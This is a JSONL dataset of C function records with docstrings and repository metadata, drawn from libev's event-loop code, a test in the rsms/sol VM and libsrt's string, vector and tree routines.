{"docstring": "/* called on EBADF to verify fds */\n", "func_signal": "static void noinline ecb_cold\nfd_ebadf (EV_P)", "code": "{\n  int fd;\n\n  for (fd = 0; fd < anfdmax; ++fd)\n    if (anfds [fd].events)\n      if (!fd_valid (fd) && errno == EBADF)\n        fd_kill (EV_A_ fd);\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* return true if we are running with elevated privileges and should ignore env variables */\n", "func_signal": "int inline_size ecb_cold\nenable_secure (void)", "code": "{\n#ifdef _WIN32\n  return 0;\n#else\n  return getuid () != geteuid ()\n      || getgid () != getegid ();\n#endif\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* oh, the humanity! */\n", "func_signal": "static int\nev_pipe (int filedes [2])", "code": "{\n  struct sockaddr_in addr = { 0 };\n  int addr_size = sizeof (addr);\n  struct sockaddr_in adr2;\n  int adr2_size = sizeof (adr2);\n  SOCKET listener;\n  SOCKET sock [2] = { -1, -1 };\n\n  if ((listener = socket (AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)\n    return -1;\n\n  addr.sin_family = AF_INET;\n  addr.sin_addr.s_addr = htonl (INADDR_LOOPBACK);\n  addr.sin_port = 0;\n\n  if (bind (listener, (struct sockaddr *)&addr, addr_size))\n    goto fail;\n\n  if (getsockname (listener, (struct sockaddr *)&addr, &addr_size))\n    goto fail;\n\n  if (listen (listener, 1))\n    goto fail;\n\n  if ((sock [0] = socket (AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)\n    goto fail;\n\n  if (connect (sock [0], (struct sockaddr *)&addr, addr_size))\n    goto fail;\n\n  if ((sock [1] = accept (listener, 0, 0)) < 0)\n    goto fail;\n\n  /* windows vista returns fantasy port numbers for sockets:\n   * example for two interconnected tcp sockets:\n   *\n   * (Socket::unpack_sockaddr_in getsockname $sock0)[0] == 53364\n   * (Socket::unpack_sockaddr_in getpeername $sock0)[0] == 53363\n   * (Socket::unpack_sockaddr_in getsockname $sock1)[0] == 53363\n   * (Socket::unpack_sockaddr_in getpeername $sock1)[0] == 53365\n   *\n   * wow! tridirectional sockets!\n   *\n   * this way of checking ports seems to work:\n   */\n  if (getpeername (sock [0], (struct sockaddr *)&addr, &addr_size))\n    goto fail;\n\n  if (getsockname (sock [1], (struct sockaddr *)&adr2, &adr2_size))\n    goto fail;\n\n  errno = WSAEINVAL;\n  if (addr_size != adr2_size\n      || addr.sin_addr.s_addr != adr2.sin_addr.s_addr /* just to be sure, I mean, it's windows */\n      || addr.sin_port        != adr2.sin_port)\n    goto fail;\n\n  closesocket (listener);\n\n#if EV_SELECT_IS_WINSOCKET\n  filedes [0] = EV_WIN32_HANDLE_TO_FD (sock [0]);\n  filedes [1] = EV_WIN32_HANDLE_TO_FD (sock [1]);\n#else\n  /* when select isn't winsocket, we also expect socket, connect, accept etc.\n   * to work on fds */\n  filedes [0] = sock [0];\n  filedes [1] = sock [1];\n#endif\n\n  return 0;\n\nfail:\n  closesocket (listener);\n\n  if (sock [0] != INVALID_SOCKET) closesocket (sock [0]);\n  if (sock [1] != INVALID_SOCKET) closesocket (sock [1]);\n\n  return -1;\n}", "path": "sol/deps/libev/ev_win32.c", "commit_date": "2012-10-14 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* make sure the external fd watch events are in-sync */\n/* with the kernel/libev internal state */\n", "func_signal": "inline_size void\nfd_reify (EV_P)", "code": "{\n  int i;\n\n#if EV_SELECT_IS_WINSOCKET || EV_USE_IOCP\n  for (i = 0; i < fdchangecnt; ++i)\n    {\n      int fd = fdchanges [i];\n      ANFD *anfd = anfds + fd;\n\n      if (anfd->reify & EV__IOFDSET && anfd->head)\n        {\n          SOCKET handle = EV_FD_TO_WIN32_HANDLE (fd);\n\n          if (handle != anfd->handle)\n            {\n              unsigned long arg;\n\n              assert ((\"libev: only socket fds supported in this configuration\", ioctlsocket (handle, FIONREAD, &arg) == 0));\n\n              /* handle changed, but fd didn't - we need to do it in two steps */\n              backend_modify (EV_A_ fd, anfd->events, 0);\n              anfd->events = 0;\n              anfd->handle = handle;\n            }\n        }\n    }\n#endif\n\n  for (i = 0; i < fdchangecnt; ++i)\n    {\n      int fd = fdchanges [i];\n      ANFD *anfd = anfds + fd;\n      ev_io *w;\n\n      unsigned char o_events = anfd->events;\n      unsigned char o_reify  = anfd->reify;\n\n      anfd->reify  = 0;\n\n      /*if (expect_true (o_reify & EV_ANFD_REIFY)) probably a deoptimisation */\n        {\n          anfd->events = 0;\n\n          for (w = (ev_io *)anfd->head; w; w = (ev_io *)((WL)w)->next)\n            anfd->events |= (unsigned char)w->events;\n\n          if (o_events != anfd->events)\n            o_reify = EV__IOFDSET; /* actually |= */\n        }\n\n      if (o_reify & EV__IOFDSET)\n        backend_modify (EV_A_ fd, o_events, anfd->events);\n    }\n\n  fdchangecnt = 0;\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* move an element suitably so it is in a correct place */\n", "func_signal": "inline_size void\nadjustheap (ANHE *heap, int N, int k)", "code": "{\n  if (k > HEAP0 && ANHE_at (heap [k]) <= ANHE_at (heap [HPARENT (k)]))\n    upheap (heap, k);\n  else\n    downheap (heap, N, k);\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/*****************************************************************************/\n/* singly-linked list management, used when the expected list length is short */\n", "func_signal": "inline_size void\nwlist_add (WL *head, WL elem)", "code": "{\n  elem->next = *head;\n  *head = elem;\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* make periodics pending */\n", "func_signal": "inline_size void\nperiodics_reify (EV_P)", "code": "{\n  EV_FREQUENT_CHECK;\n\n  while (periodiccnt && ANHE_at (periodics [HEAP0]) < ev_rt_now)\n    {\n      int feed_count = 0;\n\n      do\n        {\n          ev_periodic *w = (ev_periodic *)ANHE_w (periodics [HEAP0]);\n\n          /*assert ((\"libev: inactive timer on periodic heap detected\", ev_is_active (w)));*/\n\n          /* first reschedule or stop timer */\n          if (w->reschedule_cb)\n            {\n              ev_at (w) = w->reschedule_cb (w, ev_rt_now);\n\n              assert ((\"libev: ev_periodic reschedule callback returned time in the past\", ev_at (w) >= ev_rt_now));\n\n              ANHE_at_cache (periodics [HEAP0]);\n              downheap (periodics, periodiccnt, HEAP0);\n            }\n          else if (w->interval)\n            {\n              periodic_recalc (EV_A_ w);\n              ANHE_at_cache (periodics [HEAP0]);\n              downheap (periodics, periodiccnt, HEAP0);\n            }\n          else\n            ev_periodic_stop (EV_A_ w); /* nonrepeating: stop timer */\n\n          EV_FREQUENT_CHECK;\n          feed_reverse (EV_A_ (W)w);\n        }\n      while (periodiccnt && ANHE_at (periodics [HEAP0]) < ev_rt_now);\n\n      feed_reverse_done (EV_A_ EV_PERIODIC);\n    }\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* away from the root */\n", "func_signal": "inline_speed void\ndownheap (ANHE *heap, int N, int k)", "code": "{\n  ANHE he = heap [k];\n\n  for (;;)\n    {\n      int c = k << 1;\n\n      if (c >= N + HEAP0)\n        break;\n\n      c += c + 1 < N + HEAP0 && ANHE_at (heap [c]) > ANHE_at (heap [c + 1])\n           ? 1 : 0;\n\n      if (ANHE_at (he) <= ANHE_at (heap [c]))\n        break;\n\n      heap [k] = heap [c];\n      ev_active (ANHE_w (heap [k])) = k;\n      \n      k = c;\n    }\n\n  heap [k] = he;\n  ev_active (ANHE_w (he)) = k;\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* simply recalculate all periodics */\n/* TODO: maybe ensure that at least one event happens when jumping forward? */\n", "func_signal": "static void noinline ecb_cold\nperiodics_reschedule (EV_P)", "code": "{\n  int i;\n\n  /* adjust periodics after time jump */\n  for (i = HEAP0; i < periodiccnt + HEAP0; ++i)\n    {\n      ev_periodic *w = (ev_periodic *)ANHE_w (periodics [i]);\n\n      if (w->reschedule_cb)\n        ev_at (w) = w->reschedule_cb (w, ev_rt_now);\n      else if (w->interval)\n        periodic_recalc (EV_A_ w);\n\n      ANHE_at_cache (periodics [i]);\n    }\n\n  reheap (periodics, periodiccnt);\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* something about the given fd changed */\n", "func_signal": "inline_size void\nfd_change (EV_P_ int fd, int flags)", "code": "{\n  unsigned char reify = anfds [fd].reify;\n  anfds [fd].reify |= flags;\n\n  if (expect_true (!reify))\n    {\n      ++fdchangecnt;\n      array_needsize (int, fdchanges, fdchangemax, fdchangecnt, EMPTY2);\n      fdchanges [fdchangecnt - 1] = fd;\n    }\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* initialise a loop structure, must be zero-initialised */\n", "func_signal": "static void noinline ecb_cold\nloop_init (EV_P_ unsigned int flags)", "code": "{\n  if (!backend)\n    {\n      origflags = flags;\n\n#if EV_USE_REALTIME\n      if (!have_realtime)\n        {\n          struct timespec ts;\n\n          if (!clock_gettime (CLOCK_REALTIME, &ts))\n            have_realtime = 1;\n        }\n#endif\n\n#if EV_USE_MONOTONIC\n      if (!have_monotonic)\n        {\n          struct timespec ts;\n\n          if (!clock_gettime (CLOCK_MONOTONIC, &ts))\n            have_monotonic = 1;\n        }\n#endif\n\n      /* pid check not overridable via env */\n#ifndef _WIN32\n      if (flags & EVFLAG_FORKCHECK)\n        curpid = getpid ();\n#endif\n\n      if (!(flags & EVFLAG_NOENV)\n          && !enable_secure ()\n          && getenv (\"LIBEV_FLAGS\"))\n        flags = atoi (getenv (\"LIBEV_FLAGS\"));\n\n      ev_rt_now          = ev_time ();\n      mn_now             = get_clock ();\n      now_floor          = mn_now;\n      rtmn_diff          = ev_rt_now - mn_now;\n#if EV_FEATURE_API\n      invoke_cb          = ev_invoke_pending;\n#endif\n\n      io_blocktime       = 0.;\n      timeout_blocktime  = 0.;\n      backend            = 0;\n      backend_fd         = -1;\n      sig_pending        = 0;\n#if EV_ASYNC_ENABLE\n      async_pending      = 0;\n#endif\n      pipe_write_skipped = 0;\n      pipe_write_wanted  = 0;\n#if EV_USE_INOTIFY\n      fs_fd              = flags & EVFLAG_NOINOTIFY ? -1 : -2;\n#endif\n#if EV_USE_SIGNALFD\n      sigfd              = flags & EVFLAG_SIGNALFD  ? -2 : -1;\n#endif\n\n      if (!(flags & EVBACKEND_MASK))\n        flags |= ev_recommended_backends ();\n\n#if EV_USE_IOCP\n      if (!backend && (flags & EVBACKEND_IOCP  )) backend = iocp_init   (EV_A_ flags);\n#endif\n#if EV_USE_PORT\n      if (!backend && (flags & EVBACKEND_PORT  )) backend = port_init   (EV_A_ flags);\n#endif\n#if EV_USE_KQUEUE\n      if (!backend && (flags & EVBACKEND_KQUEUE)) backend = kqueue_init (EV_A_ flags);\n#endif\n#if EV_USE_EPOLL\n      if (!backend && (flags & EVBACKEND_EPOLL )) backend = epoll_init  (EV_A_ flags);\n#endif\n#if EV_USE_POLL\n      if (!backend && (flags & EVBACKEND_POLL  )) backend = poll_init   (EV_A_ flags);\n#endif\n#if EV_USE_SELECT\n      if (!backend && (flags & EVBACKEND_SELECT)) backend = select_init (EV_A_ flags);\n#endif\n\n      ev_prepare_init (&pending_w, pendingcb);\n\n#if EV_SIGNAL_ENABLE || EV_ASYNC_ENABLE\n      ev_init (&pipe_w, pipecb);\n      ev_set_priority (&pipe_w, EV_MAXPRI);\n#endif\n    }\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* internal, faster, version of ev_clear_pending */\n", "func_signal": "inline_speed void\nclear_pending (EV_P_ W w)", "code": "{\n  if (w->pending)\n    {\n      pendings [ABSPRI (w)][w->pending - 1].w = (W)&pending_w;\n      w->pending = 0;\n    }\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* the given fd is invalid/unusable, so make sure it doesn't hurt us anymore */\n", "func_signal": "inline_speed void ecb_cold\nfd_kill (EV_P_ int fd)", "code": "{\n  ev_io *w;\n\n  while ((w = (ev_io *)anfds [fd].head))\n    {\n      ev_io_stop (EV_A_ w);\n      ev_feed_event (EV_A_ (W)w, EV_ERROR | EV_READ | EV_WRITE);\n    }\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* fetch new monotonic and realtime times from the kernel */\n/* also detect if there was a timejump, and act accordingly */\n", "func_signal": "inline_speed void\ntime_update (EV_P_ ev_tstamp max_block)", "code": "{\n#if EV_USE_MONOTONIC\n  if (expect_true (have_monotonic))\n    {\n      int i;\n      ev_tstamp odiff = rtmn_diff;\n\n      mn_now = get_clock ();\n\n      /* only fetch the realtime clock every 0.5*MIN_TIMEJUMP seconds */\n      /* interpolate in the meantime */\n      if (expect_true (mn_now - now_floor < MIN_TIMEJUMP * .5))\n        {\n          ev_rt_now = rtmn_diff + mn_now;\n          return;\n        }\n\n      now_floor = mn_now;\n      ev_rt_now = ev_time ();\n\n      /* loop a few times, before making important decisions.\n       * on the choice of \"4\": one iteration isn't enough,\n       * in case we get preempted during the calls to\n       * ev_time and get_clock. a second call is almost guaranteed\n       * to succeed in that case, though. and looping a few more times\n       * doesn't hurt either as we only do this on time-jumps or\n       * in the unlikely event of having been preempted here.\n       */\n      for (i = 4; --i; )\n        {\n          ev_tstamp diff;\n          rtmn_diff = ev_rt_now - mn_now;\n\n          diff = odiff - rtmn_diff;\n\n          if (expect_true ((diff < 0. ? -diff : diff) < MIN_TIMEJUMP))\n            return; /* all is well */\n\n          ev_rt_now = ev_time ();\n          mn_now    = get_clock ();\n          now_floor = mn_now;\n        }\n\n      /* no timer adjustment, as the monotonic clock doesn't jump */\n      /* timers_reschedule (EV_A_ rtmn_diff - odiff) */\n# if EV_PERIODIC_ENABLE\n      periodics_reschedule (EV_A);\n# endif\n    }\n  else\n#endif\n    {\n      ev_rt_now = ev_time ();\n\n      if (expect_false (mn_now > ev_rt_now || ev_rt_now > mn_now + max_block + MIN_TIMEJUMP))\n        {\n          /* adjust timers. this is easy, as the offset is the same for all of them */\n          timers_reschedule (EV_A_ ev_rt_now - mn_now);\n#if EV_PERIODIC_ENABLE\n          periodics_reschedule (EV_A);\n#endif\n        }\n\n      mn_now = ev_rt_now;\n    }\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* find a suitable new size for the given array, */\n/* hopefully by rounding to a nice-to-malloc size */\n", "func_signal": "inline_size int\narray_nextsize (int elem, int cur, int cnt)", "code": "{\n  int ncur = cur + 1;\n\n  do\n    ncur <<= 1;\n  while (cnt > ncur);\n\n  /* if size is large, round to MALLOC_ROUND - 4 * longs to accommodate malloc overhead */\n  if (elem * ncur > MALLOC_ROUND - sizeof (void *) * 4)\n    {\n      ncur *= elem;\n      ncur = (ncur + elem + (MALLOC_ROUND - 1) + sizeof (void *) * 4) & ~(MALLOC_ROUND - 1);\n      ncur = ncur - sizeof (void *) * 4;\n      ncur /= elem;\n    }\n\n  return ncur;\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* towards the root */\n", "func_signal": "inline_speed void\nupheap (ANHE *heap, int k)", "code": "{\n  ANHE he = heap [k];\n\n  for (;;)\n    {\n      int p = HPARENT (k);\n\n      if (UPHEAP_DONE (p, k) || ANHE_at (heap [p]) <= ANHE_at (he))\n        break;\n\n      heap [k] = heap [p];\n      ev_active (ANHE_w (heap [k])) = k;\n      k = p;\n    }\n\n  heap [k] = he;\n  ev_active (ANHE_w (he)) = k;\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* check whether the given fd is actually valid, for error recovery */\n", "func_signal": "inline_size int ecb_cold\nfd_valid (int fd)", "code": "{\n#ifdef _WIN32\n  return EV_FD_TO_WIN32_HANDLE (fd) != -1;\n#else\n  return fcntl (fd, F_GETFD) != -1;\n#endif\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "// For verifying call sequence\n", "func_signal": "void task1_on_resumed(SVM* vm, SSched* s, STask* t, SInstr* pc)", "code": "{\n  // This is called as task1 is resumed after the timer triggered\n  STrace();\n  assert(t == task1);\n  assert(sequence++ == 2);\n\n  // AR's PC should be 1 less than the PC when this callback function is called.\n  assert(t->ar->pc+1 == pc);\n\n  // AR's PC should be at the first YIELD instruction\n  assert(SInstrGetOP(*t->ar->pc) == S_OP_YIELD);\n  assert(SInstrGetA(*t->ar->pc) == 1); // wait for timer\n\n  // Verify that task1 is the only task in the run queue (task2 has already\n  // ended)\n  assert(s->rhead == task1);\n  assert(s->rtail == task1);\n  assert(task1->next == 0);\n\n  // Verify that the wait queue is empty\n  assert(s->whead == 0);\n  assert(s->wtail == 0);\n\n  assert(sequence++ == 3);\n}", "path": "sol/test/test_prog_timer.c", "commit_date": "2012-10-28 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/* away from the root */\n", "func_signal": "inline_speed void\ndownheap (ANHE *heap, int N, int k)", "code": "{\n  ANHE he = heap [k];\n  ANHE *E = heap + N + HEAP0;\n\n  for (;;)\n    {\n      ev_tstamp minat;\n      ANHE *minpos;\n      ANHE *pos = heap + DHEAP * (k - HEAP0) + HEAP0 + 1;\n\n      /* find minimum child */\n      if (expect_true (pos + DHEAP - 1 < E))\n        {\n          /* fast path */                               (minpos = pos + 0), (minat = ANHE_at (*minpos));\n          if (               ANHE_at (pos [1]) < minat) (minpos = pos + 1), (minat = ANHE_at (*minpos));\n          if (               ANHE_at (pos [2]) < minat) (minpos = pos + 2), (minat = ANHE_at (*minpos));\n          if (               ANHE_at (pos [3]) < minat) (minpos = pos + 3), (minat = ANHE_at (*minpos));\n        }\n      else if (pos < E)\n        {\n          /* slow path */                               (minpos = pos + 0), (minat = ANHE_at (*minpos));\n          if (pos + 1 < E && ANHE_at (pos [1]) < minat) (minpos = pos + 1), (minat = ANHE_at (*minpos));\n          if (pos + 2 < E && ANHE_at (pos [2]) < minat) (minpos = pos + 2), (minat = ANHE_at (*minpos));\n          if (pos + 3 < E && ANHE_at (pos [3]) < minat) (minpos = pos + 3), (minat = ANHE_at (*minpos));\n        }\n      else\n        break;\n\n      if (ANHE_at (he) <= minat)\n        break;\n\n      heap [k] = *minpos;\n      ev_active (ANHE_w (*minpos)) = k;\n\n      k = minpos - heap;\n    }\n\n  heap [k] = he;\n  ev_active (ANHE_w (he)) = k;\n}", "path": "sol/deps/libev/ev.c", "commit_date": "2012-10-15 00:00:00", "repo_name": "rsms/sol", "stars": 518, "license": "None", "language": "c", "size": 719}
{"docstring": "/*\n * Allocation from other sources: \"dup\"\n */\n", "func_signal": "srt_vector *sv_dup(const srt_vector *src)", "code": "{\n\tsrt_vector *v = NULL;\n\treturn sv_cpy(&v, src);\n}", "path": "libsrt/src/svector.c", "commit_date": "2020-02-09 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/* maximum size for an escape sequence: 16 bytes */\n", "func_signal": "static int syntax_error(const char **argv, const int exit_code)", "code": "{\n\tconst char *v0 = argv[0];\n\tfprintf(stderr,\n\t\t\"Buffer encoding/decoding (libsrt example)\\n\\n\"\n\t\t\"Syntax: %s [-eb|-db|-eh|-eH|-dh|-ex|-dx|-ej|-dj|\"\n\t\t\"-eu|-du|-ez|-dz|-crc32|-adler32|-fnv|-fnv1a]\\n\\nExamples:\\n\"\n\t\t\"%s -eb <in >out.b64\\n%s -db <in.b64 >out\\n\"\n\t\t\"%s -eh <in >out.hex\\n%s -eH <in >out.HEX\\n\"\n\t\t\"%s -dh <in.hex >out\\n%s -dh <in.HEX >out\\n\"\n\t\t\"%s -ex <in >out.xml.esc\\n%s -dx <in.xml.esc >out\\n\"\n\t\t\"%s -ej <in >out.json.esc\\n%s -dj <in.json.esc >out\\n\"\n\t\t\"%s -eu <in >out.url.esc\\n%s -du <in.url.esc >out\\n\"\n\t\t\"%s -ez <in >in.lz\\n%s -dz <in.lz >out\\n\"\n\t\t\"%s -ezh <in >in.lz\\n%s -dz <in.lz >out\\n\"\n\t\t\"%s -crc32 <in\\n%s -crc32 <in >out\\n\"\n\t\t\"%s -adler32 <in\\n%s -adler32 <in >out\\n\"\n\t\t\"%s -fnv1 <in\\n%s -fnv1 <in >out\\n\"\n\t\t\"%s -fnv1a <in\\n%s -fnv1a <in >out\\n\"\n\t\t\"%s -mh3_32 <in\\n%s -mh3_32 <in >out\\n\",\n\t\tv0, v0, v0, v0, v0, v0, v0, v0, v0, v0, v0, v0, v0, v0, v0, v0,\n\t\tv0, v0, v0, v0, v0, v0, v0, v0, v0, v0, v0);\n\treturn exit_code;\n}", "path": "libsrt/test/enc.c", "commit_date": "2020-02-01 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Allocation\n */\n", "func_signal": "srt_tree *st_alloc_raw(srt_cmp cmp_f, srt_bool ext_buf, void *buffer,\n\t\t       size_t elem_size, size_t max_size)", "code": "{\n\tsrt_tree *t;\n\tRETURN_IF(!cmp_f || !elem_size || !buffer, st_void);\n\tt = (srt_tree *)buffer;\n\tsd_reset((srt_data *)t, sizeof(srt_tree), elem_size, max_size, ext_buf,\n\t\t S_FALSE);\n\tt->cmp_f = cmp_f;\n\tt->root = 0;\n\treturn t;\n}", "path": "libsrt/src/saux/stree.c", "commit_date": "2020-02-01 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Append\n */\n", "func_signal": "srt_vector *sv_cat_aux(srt_vector **v, const srt_vector *v1, ...)", "code": "{\n\tva_list ap;\n\tconst srt_vector *v0, *next;\n\tsize_t v0s;\n\tASSERT_RETURN_IF(!v, sv_void);\n\tv0 = *v;\n\tv0s = v0 ? sv_size(v0) : 0;\n\tva_start(ap, v1);\n\tnext = v1;\n\twhile (!s_varg_tail_ptr_tag(next)) { /* last element tag */\n\t\tif (next) {\t\t     /* cat next with aliasing check */\n\t\t\tconst srt_vector *nexta = next == v0 ? *v : next;\n\t\t\tsize_t nexta_s = next == v0 ? v0s : sv_len(next);\n\t\t\taux_cat(v, S_TRUE, nexta, nexta_s);\n\t\t}\n\t\tnext = (srt_vector *)va_arg(ap, srt_vector *);\n\t}\n\tva_end(ap);\n\treturn sv_check(v);\n}", "path": "libsrt/src/svector.c", "commit_date": "2020-02-09 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Operations\n */\n", "func_signal": "srt_tree *st_dup(const srt_tree *t)", "code": "{\n\tsrt_tree *t2;\n\tRETURN_IF(!t, NULL);\n\tt2 = st_alloc(t->cmp_f, t->d.elem_size, t->d.size);\n\tRETURN_IF(!t2, NULL);\n\tmemcpy(t2, t, t->d.header_size + t->d.size * t->d.elem_size);\n\treturn t2;\n}", "path": "libsrt/src/saux/stree.c", "commit_date": "2020-02-01 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Assignment from a given source: ss_cpy*(s, ...)\n */\n", "func_signal": "srt_string *ss_cpy(srt_string **s, const srt_string *src)", "code": "{\n\tRETURN_IF(!s, ss_void);\n\tRETURN_IF(*s == src && ss_check(s), *s); /* aliasing, same string */\n\tss_clear(*s);\n\tRETURN_IF(!src, *s); /* BEHAVIOR: empty */\n\treturn ss_cat(s, src);\n}", "path": "libsrt/src/sstring.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Search\n */\n", "func_signal": "static size_t sv_find_aux(const srt_vector *v, size_t off, const void *tgt,\n\t\t\t  size_t tgt_size)", "code": "{\n\tsize_t pos, size, elem_size, off_max, i;\n\tconst void *p;\n\tRETURN_IF(!v || v->d.sub_type > SV_GEN, S_NPOS);\n\tpos = S_NPOS;\n\tsize = sv_size(v);\n\tp = sv_get_buffer_r(v);\n\telem_size = v->d.elem_size;\n\tRETURN_IF(!elem_size || (tgt_size && elem_size != tgt_size), S_NPOS);\n\toff_max = size * v->d.elem_size;\n\ti = off * elem_size;\n\tfor (; i < off_max; i += elem_size)\n\t\tif (!memcmp((const char *)p + i, tgt, elem_size))\n\t\t\treturn i / elem_size; /* found */\n\treturn pos;\n}", "path": "libsrt/src/svector.c", "commit_date": "2020-02-09 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Concatenate/append from given source/s: a = ss_cat*\n */\n", "func_signal": "srt_string *ss_cat_aux(srt_string **s, const srt_string *s1, ...)", "code": "{\n\tva_list ap;\n\tconst srt_string *next, *s0;\n\tsize_t extra_size, nargs, ss0, uss0, i;\n\tRETURN_IF(!s, ss_void);\n\tif (s1 && ss_size(s1) > 0) {\n\t\textra_size = nargs = 0;\n\t\tnext = s1;\n\t\ts0 = *s;\n\t\tva_start(ap, s1);\n\t\twhile (!s_varg_tail_ptr_tag(next)) { /* last element tag */\n\t\t\tif (next)\n\t\t\t\textra_size += ss_size(next);\n\t\t\tnext = va_arg(ap, const srt_string *);\n\t\t\tnargs++;\n\t\t}\n\t\tva_end(ap);\n\t\tss0 = *s ? ss_size(s0) : 0;\n\t\tuss0 = s0 ? get_unicode_size(s0) : 0;\n\t\tif (ss_grow(s, extra_size)) {\n\t\t\tss_cat_aliasing(s, s0, ss0, uss0, s1);\n\t\t\tif (nargs == 1)\n\t\t\t\treturn *s;\n\t\t\tva_start(ap, s1);\n\t\t\ti = 1;\n\t\t\tfor (; i < nargs; i++) {\n\t\t\t\tnext = va_arg(ap, const srt_string *);\n\t\t\t\tif (next)\n\t\t\t\t\tss_cat_aliasing(s, s0, ss0, uss0, next);\n\t\t\t}\n\t\t\tva_end(ap);\n\t\t}\n\t}\n\treturn ss_check(s);\n}", "path": "libsrt/src/sstring.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * If current node is the tree root node, change the root index so it targets\n * the new node.\n */\n", "func_signal": "S_INLINE void st_checkfix_root(srt_tree *t, srt_tndx pivot, srt_tndx new_pivot)", "code": "{\n\tif (pivot == t->root) {\n\t\tt->root = new_pivot;\n\t\t/*set_red(t, t->root, S_FALSE);*/\n\t}\n}", "path": "libsrt/src/saux/stree.c", "commit_date": "2020-02-01 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Allocation from a given source: s = ss_dup*\n * (equivalent to: s = NULL; ss_cpy*(&s, ...);)\n */\n", "func_signal": "srt_string *ss_dup(const srt_string *src)", "code": "{\n\tsrt_string *s = NULL;\n\treturn ss_cpy(&s, src);\n}", "path": "libsrt/src/sstring.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Allocation\n */\n", "func_signal": "srt_vector *sv_alloc_raw(enum eSV_Type t, srt_bool ext_buf, void *buffer,\n\t\t\t size_t elem_size, size_t max_size,\n\t\t\t const srt_vector_cmp f)", "code": "{\n\tsrt_vector *v;\n\tRETURN_IF(!elem_size || !buffer, sv_void);\n\tv = (srt_vector *)buffer;\n\tsd_reset((srt_data *)v, sizeof(srt_vector), elem_size, max_size,\n\t\t ext_buf, S_FALSE);\n\tv->d.sub_type = (uint8_t)t;\n\tv->vx.cmpf = t <= SV_LAST_NUM ? svt_cmpf[t] : f;\n\treturn v;\n}", "path": "libsrt/src/svector.c", "commit_date": "2020-02-09 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
